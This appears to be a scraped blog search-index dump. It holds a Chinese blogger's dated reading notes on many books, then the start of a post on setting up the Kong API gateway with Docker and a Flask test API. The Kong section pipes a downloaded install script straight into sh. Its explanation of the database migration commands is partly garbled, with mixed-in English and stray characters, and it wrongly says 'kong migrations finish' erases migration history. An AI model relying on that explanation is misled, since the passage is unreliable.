《未来站在中国这一边》这是一本通过列各种数据来说明我国各个行业的龙头企业基本都是世界前列的，除了最近几年被卡脖子的产业，比如半导体。还有一点让人颠覆的是，我们都认为国企的技术可能一般般，效率又低，但是实际并不是这样，比如中石化、中石油，给我们的印象就是卖油的，还基本是垄断，然而实际情况恰恰相反，石油和天然气开采具有极高的技术含量，石油和天然气开采是不折不扣的高科技行业，以前，世界上能够掌握从勘探、开发、设备、炼制、陆地石油和海上石油开采全流程技术和装备制造的，只有欧美国家。确切地说，世界上唯一一个真正地掌握了全流程核心技术的只有美国，欧洲作为一个整体也可以算一个。我们比较熟悉的高铁就是中国中车搞的，这个大家也比较熟悉了，确实也是高科技，也是世界领先的。千亿美元公司的数量可以说是一个国家的核心力量了，全球总共53家千亿美元公司，美国22家，日本5家，德国4家，法国3家，英国和荷兰各2家，瑞士、韩国各1家，总共40家，而其余13家千亿美元公司，都是来自中国，我们是唯一一个发展中国家，而且我们是第二多的。 当然我们还有很多亟需追赶的方面，对于半导体，作者使用了一万年也要搞出来这样的描述，可见半导体的重要性，当然现在国家也非常重视，发展起来估计只是时间问题了。这本书可能适合快速看看，看看咱们的一些牛逼企业，还有哪些方面是不足的。——20210410 《局外人》这本书看完一直没有写总结，主要的原因是懒，现在打字这一刻已经是20210711了，可能另外一个原因是对这本书理解不够深刻，对于这本书最深刻的是主人公莫尔索对于妈妈的离去，以及参加葬礼的时候没有像平常人那样表现，感觉离去的并不是自己妈妈，面对妈妈的离去是冷漠的，这挑战了现有的道德观念。而后面莫尔索在海滩上杀死阿拉伯人，司法机关的审判依据并不是他杀人的犯罪行为，而是针对他在母亲的葬礼上没有哭这一冷漠的道德行为，这就有点荒诞了。莫尔索他是一个非常真实的一个人，他说过：人生在世，永远也不该演戏作假。对于女友提出的结婚，结不结都行，她想结就结，但她问她爱不爱她，他诚恳地说“不爱”。后面律师想让他在法庭上说那天是因为控制住了自己悲痛的情绪所以才没哭，但他说：“不，那是假话”。正是这样的真实，让莫尔索成了这个社会的局外人，他不是因为杀人而判死刑，而只是在母亲的葬礼上没有哭，次日就跟新交的女朋友去游泳，看喜剧电影，并与她做爱。这个是书中的社会所不能接受的，所以这个人肯定是不能留了。不过书中的莫尔索确实过于极端了，我们在有一些事情上确实不要太真实，很容易伤害到别人，这样自己就可能真成局外人了，在不太影响别人的情况下，你可以做你自己，做真实的自己，你可以安于现状，也可以为梦想奋斗，你可以宅在家里，也可以出去旅行，你可以辞职去做你喜欢的工作，也可以边工作，边学习自己感兴趣的东西。当然了，有时候虚假比真实好，比如善意的谎言，判断标准应该可以是不要伤害到别人。当局外人应该是很孤独的，愿我们在真实中保留一丝虚假，融入局中，健康快乐地生活。——20210422 《涛动周期论》这本书以现在的知识去读，很难读，很多名词不太懂，那就是前置知识没够，最坑爹的是读这本书差点把读书习惯都给完全打破了，很久都没怎么读书了，得赶紧找回来才行。我就摘抄下一些有启发的语句，顺便添点东西：有些人或者是国外认为中国因素是2000年以来国际市场上大宗资源品价格持续上升的原因，可能他们只是认为，随着中国经济的崛起，中国对资源的消耗量日益增多，在国内资源不能满足需求的情况下，通过不断的增加进口来满足经济增长的需求，从而被普遍认为是拉动国际资源需求和本轮大宗商品价格上涨的主要原因，这种解释被称为中国因素。然而中国因素的偏颇之处在于忽略了两个事实。第一个是世界制造业大量向中国转移，中国只是世界产业链上的加工者。第二个是中国近年来的经济快速增长中外需起着突出作用，因此中国只是世界加工厂，是世界制造业的集散地，为世界市场提供制造业商品，当然也为世界消耗资源，而这种局面正式建立在世界经济共同的繁荣前提之下的。之后书中举了一个数据，如果从总量上推算，中国所消耗的资源有3~4成是为世界所消耗，这恰恰是世界经济周期复苏和繁荣的结果。所以关于中国因素，其实是中国牺牲了利润来缓解世界的通胀，这完全是国外吃了便宜还指责咱们。此外，大量的超额流动性，以外国直接投资的形式进入中国的实体经济领域，一方面推动了中国经济高速增长，造成国际资源品短缺和价格上升，另一方面大量的国际直接投资，导致中国制造业产能过剩，加上原本低廉的成本，以及中国在共生模式中的劣势地位所决定的转嫁资源成本能力较弱，世界的通货膨胀被大大的缓解了。作者周金涛有句名言：“人生发财靠康博”，就是说我每个人的财富积累一定不要以为是你多有本事，财富积累完全来源于经济周期运动的阶段给你带来的机会，比如过去中国暴富的煤老板，现在你看看还有煤老板什么事没有，大家心里肯定肯定认为煤老板不如我有本事，原因就在于天时给的机会，按照康德拉季耶夫理论看当时是大宗商品的牛市，那就给了煤老板发财的机会了。作者还说咱们一生所能抓住的机会理论上只有3次，抓住一次至少就成为中产阶级了，看来有空的研究研究康德拉季耶夫周期啊。——20210512 《把自己作为方法》 我好像就只记录了一句： 真正的英雄不是改变世界，而是改变自己生活的每一天。这句话我们可以品味一下，我们将自己的生活每天变好一点，我们就变得更好，或许身边的人受到感染也会变得更好，当每个人都更好了，这个世界不就更好了，这不就相当于改变了世界吗？项飙这个把自己作为方法，可能是不用固化理论，把自己的直接观察和思考作为方法，比如在本科阶段就做出了学术水平很高的北京“浙江村”调查，就是这么一个简单的方法，也把学术研究做到世界水平。里面说到乡绅精神，它是一种自主精神，对自己所在的这个区域关心与责任感，同时，对大体制也有相当的理解，知道如何调和。里面也提到“中心和边缘化”问题，古代士绅在京城或外地做完官，是“告老还乡”，也就是把政治文化资源带回家乡，这构成了中心和边缘的循环。所以有人说，中国现代化的一个象征，就是官员退休不再回家乡了。但现在就有一个问题，中国这么大，不可能人人都到中心去。我们生活得焦虑，很大一个原因，在于大家默认边缘就等于没有意义，边缘保留不住资源，所以都拼命地往中心挤，自己去不成，也得让孩子去。而类似乡绅的态度，也许更符合现实，可以帮助我们把自己身处的地方，建设成一个局部的中心。 ——20210531 《心态是健康的良药》这本书一看书名或者看看目录，再不行翻几页看看，就知道是一本纯正的鸡汤，但是当时的我可能由于好久没看鸡汤了，或许感觉自己的心态确实需要调整与加强，于是还是在图书馆借了这本书。这本书断断续续看了快21天了，基本每一页都看了，真是服了我自己，还挺佩服我自己的，开始的事情，基本都要干完。里面除了说怎样才是好的心态，好心态对健康的影响等，当然里面还举了很多名人的例子，遇到挫折是怎么做的，也举了一些反面例子，没有好好应对导致最终失败的。反正以后或者也很少主动去细看这些书了，在自己心态不好的时候最多就翻翻。一个人是否生活得愉快，不仅取决于物质条件，更重要的是精神状态。一个人具有远大的目标、正确的人生观，具备良好的心理素质和良好的心理状态，做事勤奋的人，就能收获一个美好的人生。反正里面绝大多数都是讲道理举例子，我就不复制了。——20210621 《我的二本学生》这是豆瓣2020年度图书的社科•纪实的top7，豆瓣评分其实不算高，现在只有7.6分。在一些介绍中，这是一本献给二本院校新生的入学指南，里面是一个15年教学经验的老师对学生的观察与交流，包含了近百名学生的现身说法。虽说写的二本学生，哪怕是985、211的学生，也还是会有同样的问题，只不过实际情况可能好一点。在里面真实记录了很多学生，无论你毕业于重点大学、二本还是三本，你总能从中找到自己的影子。里面有接近富二代的学生（能专心备考，考入复旦，但也有直接回去拼爹的），有因为家庭困难而放弃考研（或者放弃了梦想，还是生活要紧）出来工作的学生，有父母关系不好或者是离异的学生，有一开始生活滋润后来因为一场事故跌入贫困的学生，有家里重男轻女的女学生，有是村里唯一的大学生的学生，有考上本科复读变为专科的学生（好像主因是不喜欢不能天天洗澡的北方），有在大学被诈骗了1万元的学生，有虽在广州这大城市里长大但仍依旧为相对贫苦的学生……归根结底原生家庭对于他们的影响太大，作者自己95年大学毕业那会，他们毕业后工作包分配，房子也是分配，读书完全改变了命运，过上了滋润的生活。而到了作者05届的学生，虽说没有了分配，但是房价还相对低，所以考个公务员，在广州这座大城市也可以相对容易扎根。但是到了15届的学生，可就没那么幸运了，房价已经变得高不可攀，已经很难在广州这座大城市扎根了。作者说我们这一代面对自己的处境，认为这一切都理所当然，无法想象作者当年那个不用租房的时代，也从不怀疑高房价的合理性。但我觉得并不是，面对当今的高房价和各种内卷，绝大多数人还是不满与有所抱怨的，但是我们又能怎么办，绝大多数人只能选择躺平，扎心的是躺平可能都不容易。我们不能决定我们的出生，但能决定我们该走向何方，在书与现实中去发现世间的美好，成为更好的人。最后，我觉得这本书应该比较适合高考完到毕业已经工作了几年的人。——20210710 《蛤蟆先生去看心理医生》这本书使用动物作为主角，让人读起来还挺有意思的，所以几天就读完了。由于是朋友发现了蛤蟆先生的异常，所以让他去找心理医生，但是蛤蟆先生并不是自愿的，所以苍鹭（心理医生）说心理咨询是一个自发的过程，咨询师和来访者应该是出于自愿的原则，你应该是为自己而不是为取悦朋友来咨询时，才能真正合作。能为咨询负责的人应该是你，而不是其他任何人。同样能帮你的人是你自己，也只有你自己。里面也提到了教育方式，父亲太严格，母亲在父亲在的时候对蛤蟆先生也不太好，只有父亲不在的时候才好好地对蛤蟆，其实我们上学的时候也学过，可能慈父严母或者慈母严父比较好，都严或者都慈可能有问题。 ——20210714 《时运变迁：世界货币、美国地位与人民币的未来》这是一本大部头，看得很慢，可能还是一个内容不太有趣，另外一个也是翻译的文字比较晦涩一点。这本书的作者是两个人的，算是一本联合回忆录。一个是美联储主席保罗·沃尔克，另一个是日本大藏省前副相——行天丰雄。在里面提到日本还是过于信任美国，被美国坑了不少，所以国家之间还是只有永远的利益，没有永远的朋友。本书从布雷顿森林体系建立，讲到到崩溃。这里面就有一个特里芬难题：就是说由于美元与黄金挂钩，而其他国家的货币与美元挂钩，美元虽然取得了国际核心货币的地位，但是各国为了发展国际贸易，必须用美元作为结算与储备货币，这样就会导致流出美国的货币在海外不断沉淀，对美国国际收支来说就会发生长期逆差；而美元作为国际货币核心的前提是必须保持美元币值稳定，这又要求美国必须是一个国际贸易收支长期顺差国。这两个要求互相矛盾，因此是一个悖论。旧体系崩溃了就尝试浮动汇率改革，后面就慢慢形成了广场协议和卢浮宫协议，到现在还是解决不了这个问题——20210817 《把妹达人》这本书感觉在看故事书，有时候又感觉在看黄色小说，天天去酒吧，天天开party的感觉，最后作者他们好像浪子回头，会因为失去一个女孩而伤心。 ——20210901 《价值》这是高瓴创始人兼首席执行官张磊首部力作，一上来的观点很明确，就是长期主义，毕竟书名就是价值，看看他是怎么进行价值投资的。人大毕业的张磊，毕业后先是去了五矿集团，有了到各地出差的机会，能够进行实地考察，后来不满于现状，又去了耶鲁大学，认识了耶鲁大学捐赠基金的首席投资官大卫·斯文森等投资大师。后来创建高领的时候，收获的第一笔出资就是耶鲁大学捐赠基金的两千万美元，而后又追加了一千万美元，这都是环环相扣啊。价值投资经过这么多年的发展，已经晋升到第四代，第一代就是格雷厄姆的捡烟蒂式的价值投资，之后便是护城河式价值投资、动态护城河式价值投资和创造价值式价值投资。创造价值的核心是提供全面系统的解决方案，包括企业战略分析、嫁接优质资源、复制管理经验、提升运营效率、拓展国际业务、在海外复制中国模式，甚至通过提供争论性的话题来打开思维等（这个我们普通人肯定是搞不了）。作者坚守三个投资哲学：守正用奇（坚持高度的道德自律、人格独立、遵守规则，坚持专业与专注）、弱水三千只取一瓢、桃李不言下自成蹊（只要做正确的事情，不用去到处宣传，好的企业家会找到我们）。要成为价值投资者，要有一个重要的修养，就是不要做机械的价值投资：不要机械地长期持有，机械地寻找低估值，机械地看基本面。这不就说的我吗，太机械了，但是这样也不会亏大钱。里面除了讲投资，其实也算是顺带提了下创业，比如怎么做一名超级CEO、怎么打造文化、怎么甄别靠谱的人才等。而对于教育和人才，可能是最长远的投资主题，永远不需要退出。当教育驱动人才和社会蓬勃发展、不断创造价值的时候，在更宏大的格局观里，投资人能够发现更多有意义的事情，这也是最大化创造价值的超长期主义。——20210912 《漫长的告别》一开始并不知道这是什么类型的小说，只是看到介绍说村上春树读了12遍，应该挺厉害的，后来读着读着才发现是推理小说，是探案、悬疑小说。小说是以马洛这个私家侦探为第一人称写的，在路边偶遇特里·莱诺克斯，喝得烂醉，他是一个富婆——西尔维娅（报业大享的二千金）的老公，还把这醉汉带回了家。但是后面发生了命案，富婆赤身祼体被杀，她的脸被一个青铜像砸得血肉模糊，丈夫特里·莱诺克斯成为头号嫌疑犯。而以马洛对于特里的了解，绝对不相信这场杀人手法，极其残忍的谋杀是特里的杰作，后面算是帮特里逃到了国外，当然马洛被抓了起来，但是后来传来了特里在墨西哥留下一封自白书并自杀，马洛就被释放了。后面一个新的人物，艾琳·韦德恳求马洛寻找失踪的丈夫——酗酒的知名作家罗杰，其实读到后面才知道这个任务与特里有着千丝万缕的关系。经过艰难寻找是终于找到了，不过后来罗杰被杀， 艾琳·韦德自杀，慢慢地真相一点一点浮出水面。其实富婆的老爸知道女儿是被枪杀死的，但为了不把事情闹大，没有向警方提供这个，砸得血肉模糊就是掩盖枪杀。原来艾琳·韦德跟特里在英国相爱并结过婚，后来特里在战争中失踪，艾琳以为他已经死了，所以嫁给了作家罗杰，而特里回来跟西尔维娅结婚了，而艾琳发现罗杰和西尔维娅有不正当的关系，所以她枪杀了西尔维娅，而罗杰对此是知情的，但替她掩盖了真相，因此精神却备受折磨，艾琳后来又谋杀了罗杰并伪装成罗杰自杀的样子。至于逃跑的特里，也是知道真相的，他逃跑是为了替艾琳把所以罪名揽上身，免其受到伤害。而真相快浮出水面，艾琳也自杀了。最后特里回来了，这也是能预料到的，他假死了。马洛最后说：“别了，朋友。我不会说再见。我已经和你说过再见了，那时候说再见还有意义。那时候说的再见悲伤、孤独而决绝”——20211003 《跳槽圣经》首先，无论跳槽与否，都要测试一下自己的市场价值，市场价值由技术资产+人力资产+行业生产力，技术资产就是你的专业能力和与岗位无关的经验（如管理能力），人力资产就是你有多少人脉，多少人会帮助你，而行业生产力就是一个人的毛利润，而这是工资的主要来源。理想的职业应当是在三种要素中至少两种处于高水平状态。20岁专业性更重要，30岁经验更重要，40岁人脉关系更重要。选择公司三标准：1市场价值是否会提升2轻松的工作环境3发展才能的可能性。和伴侣沟通三步骤：1确定沟通的逻辑2引起对方的共鸣3让对方能够相信——20211011 《牧羊少年奇幻之旅》这本书讲述了牧羊少年圣地亚哥追寻宝藏的奇幻冒险故事，因为喜欢旅行，但是家里条件不允许，所以当牧羊人，既可以到处去，又可以卖羊毛挣钱。后面为了追寻宝藏把羊都卖了，帮水晶店老板把生意做得风生水起，钱也挣了不少，也是放弃继续挣钱，继续追寻宝藏，后面遇到了心爱的女人，也还是选择追寻宝藏，最终也是成功找到宝藏，与少女法谛玛终成眷属。里面有一句触动我的话：只有一样东西令梦想无法成真，那就是担心失败。是啊，担心毛毛，先上，一点一点解决，不行动肯定是失败。——20211025 《活着》余华说：“人是为活着本身而活着的，而不是为了活着之外的任何事物而活着。”，书中讲的是徐福贵的故事，是以第一人称写的，这样显得徐福贵是很乐观地看待这一切，他是幸福的，但是在旁观者的我们看来，实在是太惨了。福贵是一个实打实的富二代，家里的地可多了，看上了米行家的千金并娶了回家，人好又漂亮，但是还是出去嫖，嫖着嫖着不就把赌也沾染上了。之后当然就把家里的田地都输光了，父亲也因这个事情去世了，后面母亲生病，去城里请大夫，但被国民党抓去当兵，后面被共产党俘虏并释放了，回来母亲也去世了，女儿凤霞也因一次高烧后成为了聋哑人。后面儿子因给县长老婆输血却被医生抽干了血而死，而县长竟然是曾经出生入死的战友。后面女儿嫁给了忠厚老实的二喜，但是好日子不长，生下儿子苦根就去世了，后面二喜在工作中出意外也走了，就剩福贵和外孙苦根了，但是最终也因为豆子吃多了而撑死了。只剩一个人就买了个老牛来陪自己，也取名叫福贵。这在现实中可能很难遇到，这可能是100个、1000个人甚至1w个人的不幸都集中到福贵这个人身上。最后说说活着的意义是什么，我是认同作者的，活着本身就是意义。——20211029 《边城》边城说的是，一个边远的城市，一个老人以及他的孙女翠翠。翠翠呢，是老人女儿的女儿，当年跟一个戍兵生下了翠翠，那个戍兵可能认为是违反军规了，所以就去自杀了。翠翠的母亲呢，当时也想自杀，但是呢，就还有一个孩子们肚里，所以就先生把孩子生下来，但是最后还是去自杀了。这个老人呢，是在那个河边做那个那个过渡人，因为那个合了就没有桥，所以呢，只能就是过路的人都得坐他的船来进行过渡。里面说的最多的就是，嗯端午节的时候到那个城里去看那个龙舟比赛。在那个龙舟比赛里面呢，他就意外遇到了一个城里的一个船家，反正是一个有钱人家的二儿子，喜欢翠翠。但是后来呢，那个大儿子呢，也喜欢上了翠翠。根据书里的描述，翠翠是应该喜欢老二。后来大儿子找人去给翠翠提亲去，但是翠翠是没有答应。后面大儿子就开船去工作去了，结果最终他被淹死了。那个船家以及老二的话都感觉这个。大儿子的死呢，跟那个老人有间接的关系，因为他没有马上答应了这门婚事。但是老人的想把翠翠的婚姻大事给定了，所以后面就主动上门说，嗯老二娶不娶翠翠，由于嗯哥哥的事情，老二也没有马上答应。最终一直拖啊拖啊，拖到老人死了。最后城里的一个老人的一个好朋友过来照顾翠翠。最终以那个老二也出去工作了，跟着可能可能回来也可能再也不回来这样结束了。 边城这本书里面还说了一个叫做萧萧的一个短篇小说。里面讲的应该是他十三四岁就已经嫁到人家家里，当那个三岁儿子的一个媳妇。但是呢，有一个叫花狗大的人就引诱她，对他唱情歌啊什么的，最终他们俩就发生了关系，把萧萧的肚子给搞大了，花狗大，因为也不知道如何处理，最终是跑掉了。肚子大了，她尝试去吃那个烧香留下的灰，或者是去喝冷水，尝试把肚子里的东西给搞掉。但肚子越来越大，所以终究是瞒不过那个丈夫的家里人。所以呢，就请那个萧萧那边的人过来看看怎么办，是沉入潭底呢还是送给人家卖了就相当于。萧萧呢，就只有一个伯父，伯父当然不愿意，萧萧就这样牺牲了，所以就决定说唉把他给卖了，这样的话，萧萧的丈夫家还能收回点成本，收点钱。但是呢，一直到10月生下孩子10月怀胎，生下孩子还是没有人来，领走萧萧，最终萧萧就生下了一个男孩。跟着丈夫家里人也比较好，也就把萧萧给留下来，看是男孩的，取名牛儿，十二岁时也接了亲情媳妇年长6岁，这样才能帮家里忙。后面跟那个丈夫拜堂圆房的时候，丈夫也才10岁，后面他们俩就生了一个叫毛毛，最终以萧萧在屋前的树篱笆间看热闹，抱着新生的毛毛，同10年前抱丈夫一个样子。 边城中倒数第二个小说是——丈夫，由于贫穷，农村的女人很多都到城里去做妓女，他们的工作地点是船上，所以船也叫妓船。里面说了一个丈夫与妻子老七的故事，一天丈夫从乡下来到老七那探望老七，同时也看着她工作，妻子与别人在前舱发生性关系，丈夫在后舱听着，甚至是看着，那种感觉可以体会。老七去街市买了个手提琴给丈夫，说明老七还是很爱丈夫的，到丈夫想要回乡下，老七给了四张银票，又找大娘要了几张，但是丈夫都狠狠地摔在地上，不过结局也还好，两夫妇都回到了乡下。——20211119 《文明、现代化、价值投资与中国》里面首先讲到了一个叫做东西方社会发展指数，是莫里斯的一个研究。从公元前14,000年到公元两千年，也就是我们现在所说的2000年。一直到公元前3000年左右，东西方的发展几乎看不出任何差别，在这之后虽然两方的发展曲线都发生了一些变化，但仍然非常缓慢而到了公元1800年以后呢。社会发展轨迹就像做火箭一样，呈现出飞跃式发展，那个曲线的那个斜率，比那个指数还要陡。 有人说，人活着就是在对抗“熵增定律”，人的出现让熵减成为可能 我想说，人的出现让熵减可以更多地出现 https://blog.mimvp.com/article/46801.html 里面最深刻的是我国从商鞅变法到举孝廉制再到科举制，这是颠覆性的，这是将政治权利的传代（除了皇权）与血缘关系脱钩，慢慢地跟能力挂钩，这是极具颠覆性，也是古代中国领先西方的重要原因。 作者总结的价值投资理念只有4个。 第一、股票不仅仅是可以买卖的证券实际上代表的是对公司所有权的证书，是对公司的部分所有权，就是说投资股票，实际上是投资一家公司。 第二、理解市场是什么，股票的一方面是部分所有权，另一方面它确确实实也是一个可以交换的证券，可以随时买卖。市场的存在是为你而服务的。能够给你机会去购买所有权，当然也会给你机会让你很多年之后需要钱的时候，能够把它出样变成现金。但是市场从来不能告诉你真正的价值是什么，他只能告诉你价格是什么。 第三，投资的本质是对未来进行预测，而预测得到的结果不可能100%准确，只能是从0到接近100%。所以当我们要做判断的时候，就必须要预留很大的空间，就叫做安全边际。简单来说，安全边际就是零买入的价格一定要大大低于公司的内在价值。因为就算未来预测错误，也不会亏很多钱。 第四、就是能力圈的概念。就是投资人可以通过长期的不懈努力，真正建立起自己的能力圈，能够对某些公司某些行业获得比几乎所有人更深的理解，而且能够对公司未来长期的表现做出比所有其他人更准确的判断。——20211227 《月亮与六便士》这本书看挺久了，主要还是自己懒惰了，没怎么花时间看，一上来作者就给你留了悬念，一个人跟妻子生活了十七年，突然间要抛弃妻子和两个孩子，又不是有外遇，这是为什么呢，他说他必须画画，这又是为什么呢？这个人叫史特利克兰，后来真的就是为了画画，除了画画对任何事情都不在乎，哪怕当流浪汉，有钱就买画画的工具，对于别人的帮助与施舍，也没表现出感谢，反正非常冷酷无情，在巴黎的时候还把一个好朋友施特洛夫的妻子勃朗什给迷倒了，最后勃朗什还自杀了，最后的最后施特洛夫还收到了史特利克兰画的妻子勃朗什的裸照，就是模特躺在沙发上的姿势。不过施特洛夫真的太大度了，竟然都没有怪罪史特利克兰，还收下了这个画作。之后史特利克兰辗转马赛，最后到了他梦想中的伊甸园——塔希提岛，这里有很多土著，过着挺原始的生活，一个旅店的女老板介绍了艾塔给他当老婆，艾塔有土地，可以支持他画画，而且还生了两个孩子，不过到后面史特利克兰染上了麻风病，之前一起同住的人都抛弃了他，唯独艾塔没有抛弃他，而来到塔希提岛的史特利克兰也没有了之前的冷漠，对于艾塔也是感动与感激的，他在木房子里完成了巨型壁画，把那个过来帮他看病的库特拉斯医生都深深地震撼了，但是史特利克兰最后让艾塔毁掉房子，毁掉他最后的杰作。有人可能评论说追逐梦想就是追逐自己的厄运，满地都是六便士，他却抬头看见了月亮。六便士是英国价值最低的银币，代表现实与卑微；而月亮则象征了崇高，是美好，纯洁的代名词。但是我们普通人肯定不能像史特利克兰那样，我们可以偶尔抬头看看月亮，但是地上的六便士也要捡起来。——20220120 不需要看的书《数学分析八讲》这个直接看不下去，虽然当年高中数学还是不错的，毕业后真看不下去 这个分支就是为了让大家不要浪费时间 《一本书读懂互联网思维》《一本书读懂大数据》"}],"posts":[{"title":"试用Kong","slug":"试用Kong","date":"2023-10-29T00:00:00.000Z","updated":"2023-11-06T00:50:16.994Z","comments":true,"path":"2023/10/29/试用Kong/","link":"","permalink":"https://www.giantbranch.cn/2023/10/29/试用Kong/","excerpt":"","text":"Kong是一个基于Nginx的API网关和微服务管理平台。它提供了一组高级功能，例如请求路由、负载均衡、认证、监控和分析等，以帮助开发人员更轻松地构建和管理微服务架构。 更确切地说，Kong是一个在Nginx中运行的Lua应用程序，并且可以通过lua-nginx模块实现。Kong不是用这个模块编译Nginx，而是与OpenResty一起分发，OpenResty已经包含了lua-nginx-module。OpenResty不是Nginx的分支，而是一组扩展其功能的模块。 这为可插拔架构奠定了基础，可以在运行时启用和执行Lua脚本（称为“插件”）。 因此，我们认为Kong是微服务架构的典范：它的核心是实现数据库抽象，路由和插件管理。 插件可以存在于单独的代码库中，并且可以在几行代码中注入到请求生命周期的任何位置。 开始安装docker和docker-compose 12345# Install the latest version dockercurl -s https://get.docker.com/ | sh# Install docker composecurl -SL https://github.com/docker/compose/releases/download/v2.23.0/docker-compose-linux-x86_64 -o /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose 克隆仓库 12git clone https://github.com/Kong/docker-kongcd docker-kong/compose/ 启动 12KONG_DATABASE=postgres docker-compose --profile database up 如果没报错，可以加-d后台运行 我们可以查看下https://github.com/Kong/docker-kong/blob/master/compose/docker-compose.yml 看看docker里面启动了什么容器 这个Compose文件定义了三个服务：kong-migrations、kong-migrations-up和kong kong-migrationskong-migrations服务用于执行Kong数据库迁移的初始化操作。该服务的命令为kong migrations bootstrap，这个服务依赖于一个名为db的服务，表示它需要在db服务启动之后才能启动。此外，它还引用了一个名为kong_postgres_password的密钥，用于访问PostgreSQL数据库。该服务使用了名为kong-net的网络，并在失败时重新启动。 kong migrations bootstrap 命令是Kong在首次数据库初始化时使用的。 创建所需的数据库表 Kong需要一些核心表来存储配置数据,如kong.apis、kong.consumers等。bootstrap会根据数据库类型(Postgres/Cassandra)来创建并初始化这些核心表。 创建кong_migrations表 kong_migrations表用于记录已经运行的数据库迁移脚本版本。这Ensure the initial database schema宷一个&gt; 初始化的数据库结构。 插入初始记录 会插入一些必须的初始数据,如设置表primary key等。 标记为执行完成 在kong_migrations表中插入一条执行记录,标记bootstrap已经完成。 所以在Kong首次使用一个空数据库时,需要先执行bootstrap建立初始表结构,然后才能使用kong migrations &gt; &gt; up执行后续的数据库升级。 与直接使用up命令不同,bootstrap专门用于初始化一个空数据库。执行成功后,该数据库即可用于启动Kong。 kong-migrations-upkong-migrations-up服务与kong-migrations服务类似，kong migrations up 和 kong migrations finish 这两个命令是Kong在数据库初始化和升级时使用的。 kong migrations up: 这个命令会运行所有未应用的数据库迁移脚本,以将Kong的数据库schema更新到最新版本。 Kong的数据库脚本存放在kong/migrations/目录下,每次Kong版本升级都会添加新的迁移脚本。 kong migrations up会按文件名顺序运行新增的迁移脚本,以分阶段地更新数据库结构。 kong migrations finish: 在所有迁移脚本运行完成后,这个命令将会删除kong_migrations表中记录的所有迁移历史。 kong_migrations表中存放了已运行迁移脚本的记录,用于判断尚未运行的脚本。 finish命令清除历史后,后续再次运行kong migrations up时会从头开始运行所有脚本。 所以这两个命令组合可以完成Kong数据库的初始化更新。 kong migrations up带来所有新脚本变更 kong migrations finish重置运行历史 每次Kong版本升级都需要运行这两个命令,以更新数据库结构。 kong服务kong服务才是主要的Kong运行实例，是Kong网关的主要服务。 它使用了与前两个服务相同的Docker镜像，并可以通过环境变量${KONG_USER}指定运行用户，默认为kong。该服务配置了多个环境变量，包括Kong的管理员访问日志、代理访问日志、Kong的监听地址和端口等。它也引用了kong_postgres_password密钥，并使用了相同的网络和重新启动策略。此外，它还暴露了一些端口，包括代理监听端口、管理员监听端口以及Kong的Web管理界面监听端口。这些端口可以通过环境变量进行配置。该服务还定义了一个健康检查，每10秒执行一次kong health命令来检查服务的健康状态。它还将容器设置为只读模式，并挂载了一些卷用于存储Kong的运行数据和配置文件。最后，kong服务还设置了一个名为no-new-privileges的安全选项，用于禁止容器在运行时获取新的特权。 上面文件监听如下： 123450.0.0.0:8000127.0.0.1:8001 127.0.0.1:8002 0.0.0.0:8443 127.0.0.1:8444 123456# netstat -antp | grep docker-proxytcp 0 0 0.0.0.0:8443 0.0.0.0:* LISTEN 28466/docker-proxy tcp 0 0 127.0.0.1:8444 0.0.0.0:* LISTEN 28385/docker-proxy tcp 0 0 0.0.0.0:8000 0.0.0.0:* LISTEN 28639/docker-proxy tcp 0 0 127.0.0.1:8001 0.0.0.0:* LISTEN 28602/docker-proxy tcp 0 0 127.0.0.1:8002 0.0.0.0:* LISTEN 28550/docker-proxy 8000 就是Kong的转发流量的端口8001 使用 Admin API 或通过 decK 配置 Kong8002 访问 Kong 的管理 Web UI （ Kong Manager） https://docs.konghq.com/gateway/latest/get-started/services-and-routes/ 其实假如将监听改为0.0.0.0会更加方便实践，在生产环境应该不建议这么做了 api测试用例用python flask写了简单的api示例 123456789101112131415161718192021# cat app.py from flask import Flask, jsonifyapp = Flask(__name__)# 假设这是一个存储在数据库中的用户数据列表users = [ &#123;&apos;id&apos;: 1, &apos;name&apos;: &apos;Alice&apos;&#125;, &#123;&apos;id&apos;: 2, &apos;name&apos;: &apos;Bob&apos;&#125;, &#123;&apos;id&apos;: 3, &apos;name&apos;: &apos;Charlie&apos;&#125;]@app.route(&apos;/users/&lt;int:user_id&gt;&apos;)def get_user(user_id): for user in users: if user[&apos;id&apos;] == user_id: return jsonify(&#123;&apos;id&apos;: user[&apos;id&apos;], &apos;name&apos;: user[&apos;name&apos;]&#125;) return jsonify(&#123;&apos;error&apos;: &apos;User not found&apos;&#125;)if __name__ == &apos;__main__&apos;: app.run(host=&quot;0.0.0.0&quot;, port=808) 测试没问题： 12root@ubuntu:~# curl http://192.168.145.131:808/users/1&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;Alice&quot;&#125; 配置转发 新建服务 1234567891011121314root@ubuntu2004:~/python-api# curl -i -s -X POST http://localhost:8001/services \\&gt; --data name=flask-api \\&gt; --data url=&apos;http://192.168.145.131:808&apos;HTTP/1.1 201 CreatedDate: Sun, 05 Nov 2023 12:28:36 GMTContent-Type: application/json; charset=utf-8Connection: keep-aliveAccess-Control-Allow-Origin: *Access-Control-Allow-Credentials: trueContent-Length: 375X-Kong-Admin-Latency: 4054Server: kong/3.4.2&#123;&quot;enabled&quot;:true,&quot;write_timeout&quot;:60000,&quot;tls_verify&quot;:null,&quot;tls_verify_depth&quot;:null,&quot;retries&quot;:5,&quot;protocol&quot;:&quot;http&quot;,&quot;updated_at&quot;:1699187312,&quot;port&quot;:808,&quot;client_certificate&quot;:null,&quot;tags&quot;:null,&quot;path&quot;:null,&quot;id&quot;:&quot;3bb09dda-db8a-4587-bd0f-9cd9607f636d&quot;,&quot;connect_timeout&quot;:60000,&quot;read_timeout&quot;:60000,&quot;ca_certificates&quot;:null,&quot;host&quot;:&quot;192.168.145.131&quot;,&quot;created_at&quot;:1699187312,&quot;name&quot;:&quot;flask-api&quot;&#125; 创建路由 /flasktest的的流量定向到之前创建的 flask-api 服务 1234567891011121314root@ubuntu2004:~/python-api# curl -i -X POST http://localhost:8001/services/flask-api/routes \\&gt; --data &apos;paths[]=/flasktest&apos; \\&gt; --data name=flask-routeHTTP/1.1 201 CreatedDate: Sun, 05 Nov 2023 12:33:41 GMTContent-Type: application/json; charset=utf-8Connection: keep-aliveAccess-Control-Allow-Origin: *Access-Control-Allow-Credentials: trueContent-Length: 488X-Kong-Admin-Latency: 16Server: 